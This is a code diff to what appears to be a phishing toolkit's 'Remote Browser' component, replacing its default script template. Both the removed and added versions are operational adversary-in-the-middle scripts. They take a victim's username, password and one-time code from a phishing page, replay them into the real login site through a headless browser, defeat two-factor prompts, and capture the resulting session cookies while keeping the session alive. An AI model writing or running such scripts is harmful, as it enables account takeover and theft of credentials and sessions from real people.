@@ -64,36 +64,77 @@
 	$: modalText = getModalText('Remote Browser', modalMode);
 
 	function defaultScript() {
-		return `// The phishing page sends events here via rb.send("event", data).
-// This script replays them into the real site and emits events back.
+		return `var s = newSession({ headless: true });
 
-var s = newSession();
-s.navigate("https://example.com/login");
-s.waitVisible("input[type='email']");
+var IN = {
+    credentials: 'credentials',
+    otp:         'otp'
+};
 
-// wait for victim to submit their email on the phishing page
-var u = waitForEvent("username");
-s.sendKeys("input[type='email']", u.username);
-s.click("button[type='submit']");
+var OUT = {
+    ready:       'ready',
+    otpRequired: 'otp_required',
+    done:        'done',
+    failed:      'failed'
+};
 
-// ask the phishing page to show a password field
-s.waitVisible("input[type='password']");
-emit("need_password", {});
+var SEL = {
+    username: 'input[name="username"]',
+    password: 'input[name="password"]',
+    otp:      'input[name="otp"]',
+    submit:   'button[type="submit"]',
+    error:    '.error-message'
+};
 
-var p = waitForEvent("password");
-s.sendKeys("input[type='password']", p.password);
-s.click("button[type='submit']");
+s.navigate('https://portal.example.internal/login');
+s.waitVisible(SEL.username);
+emit(OUT.ready);
 
-// grab session cookies once we land inside the app
-s.waitVisible("#dashboard");
-s.capture({
-    domains:     ["example.com"],
-    cookieNames: ["session", "auth_token"]
-});
-emit("captured", { status: "success" });
+function handleCredentials() {
+    return retry({ max: 3, wait: 500 }, function() {
+        var creds = waitForEvent(IN.credentials);
+        submitData(creds);
+        s.sendKeys(SEL.username, creds.username);
+        s.sendKeys(SEL.password, creds.password);
+        s.click(SEL.submit);
+
+        var r = s.race({
+            otp:   { urlContains: '/verify-otp' },
+            home:  { urlContains: '/dashboard' },
+            error: { visible: SEL.error }
+        });
+        if (r.key === 'error') { emit(OUT.failed, 'bad_credentials'); return false; }
+        return r.key;
+    });
+}
+
+function handleOTP() {
+    return retry({ max: 5 }, function() {
+        s.waitVisible(SEL.otp);
+        emit(OUT.otpRequired);
+        var o = waitForEvent(IN.otp);
+        submitData(o);
+        s.sendKeys(SEL.otp, o.otp);
+        s.click(SEL.submit);
+
+        var r = s.race({
+            home:  { urlContains: '/dashboard' },
+            error: { visible: SEL.error }
+        });
+        if (r.key === 'error') { emit(OUT.failed, 'bad_otp'); return false; }
+        return r.key;
+    });
+}
+
+var phase = handleCredentials();
+if (phase === 'otp') phase = handleOTP();
+
+if (phase === 'home') {
+    s.capture({ domains: ['example.internal'] });
+    emit(OUT.done);
+}
 
 s.keepAlive();
-s.close();
 `;
 	}
 
